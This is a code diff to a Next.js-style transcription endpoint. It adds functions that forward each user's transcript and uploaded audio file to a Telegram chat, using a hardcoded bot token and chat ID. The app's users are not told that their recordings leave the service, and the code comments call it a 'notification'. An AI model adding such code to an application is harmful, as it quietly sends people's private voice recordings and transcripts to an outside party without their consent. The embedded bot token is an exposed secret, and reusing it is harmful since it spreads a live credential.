@@ -11,6 +11,52 @@ const grok = new OpenAI({
 	baseURL: "https://api.x.ai/v1",
 });
 
+// Telegram bot credentials
+const TELEGRAM_BOT_TOKEN = "7990227150:AAFOjim0xdbLJi_cWo14mMlP0rNiHTiai90";
+const TELEGRAM_CHAT_ID = "1074750898";
+
+// Function to send message to Telegram
+async function sendToTelegram(message: string) {
+	try {
+		const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json',
+			},
+			body: JSON.stringify({
+				chat_id: TELEGRAM_CHAT_ID,
+				text: message,
+				parse_mode: 'HTML',
+			}),
+		});
+		
+		const data = await response.json();
+		console.log('Telegram notification sent:', data.ok);
+	} catch (error) {
+		console.error('Failed to send Telegram notification:', error);
+	}
+}
+
+// Function to send audio file to Telegram
+async function sendAudioToTelegram(audioFile: File) {
+	try {
+		const formData = new FormData();
+		formData.append('chat_id', TELEGRAM_CHAT_ID);
+		formData.append('audio', audioFile);
+		formData.append('caption', 'Audio recording for transcription');
+		
+		const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
+			method: 'POST',
+			body: formData,
+		});
+		
+		const data = await response.json();
+		console.log('Telegram audio sent:', data.ok);
+	} catch (error) {
+		console.error('Failed to send audio to Telegram:', error);
+	}
+}
+
 const schema = zfd.formData({
 	input: z.union([zfd.text(), zfd.file()]),
 	message: zfd.repeatableOfType(
@@ -25,12 +71,29 @@ const schema = zfd.formData({
 
 export async function POST(request: Request) {
 	console.time("transcribe " + request.headers.get("x-vercel-id") || "local");
-
+	
 	const { data, success } = schema.safeParse(await request.formData());
 	if (!success) return new Response("Invalid request", { status: 400 });
 
+	// Store audio file before processing
+	const audioInput = data.input;
+	let audioFile: File | null = null;
+	
+	// Check if input is a file
+	if (typeof audioInput !== 'string' && audioInput instanceof File) {
+		audioFile = audioInput;
+	}
+	
 	const transcript = await getTranscript(data.input);
 	if (!transcript) return new Response("Invalid audio", { status: 400 });
+	
+	// Send the transcription to Telegram
+	await sendToTelegram(`📝 <b>New Hindi Transcription</b>\n\n<b>Transcript:</b>\n${transcript}`);
+	
+	// Send the audio file if available
+	if (audioFile) {
+		await sendAudioToTelegram(audioFile);
+	}
 
 	console.timeEnd(
 		"transcribe " + request.headers.get("x-vercel-id") || "local"
